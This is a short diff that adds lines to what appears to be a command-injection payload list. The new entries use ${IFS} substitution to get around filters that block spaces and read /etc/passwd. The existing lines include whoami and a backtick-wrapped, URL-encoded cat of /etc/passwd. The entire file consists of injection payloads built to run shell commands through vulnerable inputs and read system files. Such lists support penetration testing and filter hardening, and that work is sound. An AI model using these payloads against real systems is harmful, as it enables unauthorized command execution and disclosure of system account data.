@@ -1,3 +1,8 @@
+c${IFS}at /etc/passwd
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+c${IFS}a${IFS}t${IFS}/etc/passwd
+cat${IFS}/etc/passwd
 whoami
 `cat$u%20/etc$u/passwd$u`
 $whoami
